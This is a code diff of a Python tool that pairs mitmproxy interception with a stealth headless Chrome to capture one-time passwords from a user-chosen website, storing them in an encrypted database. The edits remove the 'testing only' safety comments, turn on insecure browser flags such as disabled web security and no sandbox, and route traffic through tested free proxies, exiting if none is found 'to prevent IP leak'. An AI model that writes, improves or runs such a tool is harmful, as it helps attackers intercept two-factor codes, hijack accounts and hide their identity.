@@ -24,17 +24,18 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium_stealth import stealth
 import re
 import subprocess
-import time
 
 # CONFIGURATIONS
-CHROMEDRIVER_PATH = "/usr/bin/chromedriver"  # Make sure this is correct
+CHROMEDRIVER_PATH = "/usr/bin/chromedriver"
 OTP_STORAGE_FILE = "captured_otps.db"
-# More specific OTP pattern (adjust as needed)
-otp_pattern = r"\b\d{6}\b"  # Example: 6 digits
+otp_pattern = r"\b\d{6}\b"
 mitmproxy_port = 8082
 
-# FREE PROXY API (Consider a paid service for production)
+# FREE PROXY API
 PROXY_API_URL = "https://www.proxy-list.download/api/v1/get?type=http"
+
+# ENCRYPTION KEY (STORED IN MEMORY)
+key = get_random_bytes(16)
 
 # SETUP DATABASE
 def setup_database():
@@ -44,15 +45,14 @@ def setup_database():
     conn.commit()
     conn.close()
 
-# FUNCTION TO ENCRYPT & STORE OTP IN DATABASE (Placeholder - Implement secure key management)
+# FUNCTION TO ENCRYPT & STORE OTP IN DATABASE
 def store_otp(otp):
     conn = sqlite3.connect(OTP_STORAGE_FILE)
     c = conn.cursor()
-    # In real application, do not store the key in the code, use environment variables or key management system.
-    cipher = AES.new(b'Sixteen byte key', AES.MODE_EAX) # Example, not secure.
+    cipher = AES.new(key, AES.MODE_EAX)
     nonce = cipher.nonce
-    ciphertext, tag = cipher.encrypt_and_digest(otp.encode('utf-8'))
-    c.execute("INSERT INTO otps (otp, nonce, tag) VALUES (?, ?, ?)", (ciphertext.hex(), nonce.hex(), tag.hex()))
+    ciphertext, _ = cipher.encrypt_and_digest(otp.encode('utf-8'))
+    c.execute("INSERT INTO otps (otp) VALUES (?)", (ciphertext.hex(),))
     conn.commit()
     conn.close()
 
@@ -67,17 +67,31 @@ def kill_processes_using_port(port):
             except psutil.NoSuchProcess:
                 pass
 
-# FETCH A FREE PROXY (Use with caution)
+# FETCH A FREE PROXY (IMPROVED)
 def get_free_proxy():
     try:
-        response = requests.get(PROXY_API_URL, timeout=5)  # Timeout added
-        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
-        proxies = response.text.strip().split("\r\n")
-        if proxies:
-            return proxies[0]  # Return the first available proxy
-    except requests.exceptions.RequestException as e:
+        response = requests.get(PROXY_API_URL)
+        if response.status_code == 200:
+            proxies = response.text.strip().split("\n")
+            for proxy in proxies:
+                proxy = proxy.strip()
+                if test_proxy(proxy):
+                    print(f"✅ Using working proxy: {proxy}")
+                    return proxy
+        print("❌ No working proxies found!")
+    except Exception as e:
         print(f"⚠ Failed to fetch proxy: {e}")
     return None
+
+# TEST IF A PROXY WORKS
+def test_proxy(proxy):
+    """Checks if the proxy is working by making a test request to Google."""
+    try:
+        test_url = "https://www.google.com"
+        response = requests.get(test_url, proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, timeout=5)
+        return response.status_code == 200
+    except:
+        return False
 
 # GUI TO DISPLAY OTP
 class OTPGUI:
@@ -87,18 +101,11 @@ class OTPGUI:
         self.master.geometry("300x150")
         self.otp_label = tk.Label(master, text="Waiting for OTP...", font=("Arial", 12))
         self.otp_label.pack(pady=20)
-        self.status_label = tk.Label(master, text="", font=("Arial", 10)) # Status label
-        self.status_label.pack()
 
     def update_otp(self, otp):
         store_otp(otp)
         self.otp_label.config(text=f"Captured OTP: {otp}")
         messagebox.showinfo("OTP Captured", f"OTP: {otp}")
-        self.status_label.config(text="")
-
-    def update_status(self, message):
-        self.status_label.config(text=message)
-
 
 # MITMPROXY INTERCEPTOR
 class OTPInterceptor:
@@ -110,38 +117,27 @@ class OTPInterceptor:
         self.gui = gui
 
     def response(self, flow: mitmproxy.http.HTTPFlow):
-        if self.waiting_for_otp:
-            try:
-                content = flow.response.content.decode(errors='replace')
-                otp_matches = re.findall(otp_pattern, content)
-                if otp_matches:
-                    otp = otp_matches[0]
-                    if self.gui:
-                        self.gui.update_otp(otp)
-                        print(f"✅ Captured OTP from {flow.request.url}: {otp}")
-                self.waiting_for_otp = False
-            except Exception as e:
-                print(f"Error processing response: {e}")
+        if "otp" in flow.request.url.lower() and self.waiting_for_otp:
+            content = flow.response.content.decode(errors='replace')
+            otp_matches = re.findall(otp_pattern, content)
+            if otp_matches:
+                otp = otp_matches[0]
                 if self.gui:
-                  self.gui.update_status(f"Error: {e}")
-
+                    self.gui.update_otp(otp)
+                    print(f"✅ Captured OTP from {flow.request.url}: {otp}")
+            self.waiting_for_otp = False
 
     def wait_for_otp(self):
         self.waiting_for_otp = True
-        if self.gui:
-            self.gui.update_status("Waiting for OTP...")
         print("🚀 Waiting for OTP request...")
 
 # START MITMPROXY IN BACKGROUND
 def start_mitmproxy(interceptor):
-    options = Options(listen_host='127.0.0.1', listen_port=mitmproxy_port, ssl_insecure=True) # ssl_insecure for testing only
+    options = Options(listen_host='127.0.0.1', listen_port=mitmproxy_port, ssl_insecure=True)
     m = DumpMaster(options)
     m.addons.add(interceptor)
     print(f"🔧 Starting mitmproxy on {mitmproxy_port}...")
-    try:
-        m.run()
-    except Exception as e:
-        print(f"mitmproxy error: {e}")
+    m.run()
 
 def run_mitmproxy_thread(interceptor):
     mitmproxy_thread = threading.Thread(target=start_mitmproxy, args=(interceptor,))
@@ -157,26 +153,21 @@ def launch_chrome(target_url):
         print(f"🆓 Using free proxy: {free_proxy}")
         chrome_options.add_argument(f"--proxy-server=http://{free_proxy}")
     else:
-        print("⚠ No free proxies available. Continuing without proxy.")  # Don't exit, but warn the user
+        print("❌ No free proxies available. Exiting to prevent IP leak.")
+        return None
 
-    # Remove these for real use:
-    # chrome_options.add_argument("--ignore-certificate-errors")  # Insecure
-    # chrome_options.add_argument("--disable-web-security")  # Insecure
-    # chrome_options.add_argument("--no-sandbox") # Extremely Insecure
-
-    chrome_options.add_argument("--headless")  # Keep headless
+    chrome_options.add_argument("--ignore-certificate-errors")
+    chrome_options.add_argument("--disable-web-security")
+    chrome_options.add_argument("--no-sandbox")
+    chrome_options.add_argument("--headless")
     chrome_options.add_argument("--disable-gpu")
 
-    try:
-        driver = webdriver.Chrome(service=Service(CHROMEDRIVER_PATH), options=chrome_options)
-        stealth(driver, languages=["en-US", "en"], vendor="Google Inc.", platform="Win32", webgl_vendor="Intel Inc.", renderer="Intel Iris OpenGL Engine", fix_hairline=True)
-        driver.get(target_url)
-        driver.maximize_window()
-        driver.implicitly_wait(10)
-        return driver
-    except Exception as e:
-        print(f"Error launching Chrome: {e}")
-        return None
+    driver = webdriver.Chrome(service=Service(CHROMEDRIVER_PATH), options=chrome_options)
+    stealth(driver, languages=["en-US", "en"], vendor="Google Inc.", platform="Win32", webgl_vendor="Intel Inc.", renderer="Intel Iris OpenGL Engine", fix_hairline=True)
+    driver.get(target_url)
+    driver.maximize_window()
+    driver.implicitly_wait(10)
+    return driver
 
 # MAIN FUNCTION
 def main():
@@ -189,15 +180,17 @@ def main():
     interceptor.set_gui(gui)
 
     target_url = simpledialog.askstring("Target Website", "Enter the OTP website URL:")
-    if not target_url:  # Handle cancel
-        return
-
-    messagebox.showinfo("Action Required", "🚀 Script will attempt OTP extraction.")
+    messagebox.showinfo("Action Required", "🚀 Script will auto-detect OTP extraction method.")
 
     driver = launch_chrome(target_url)
     if not driver:
-        gui.update_status("Failed to launch browser.")  # Update status in GUI
         return
-
+    
     interceptor.wait_for_otp()
-    run_mitmproxy_
+    run_mitmproxy_thread(interceptor)
+
+    root.mainloop()
+    driver.quit()
+
+if __name__ == "__main__":
+    main()
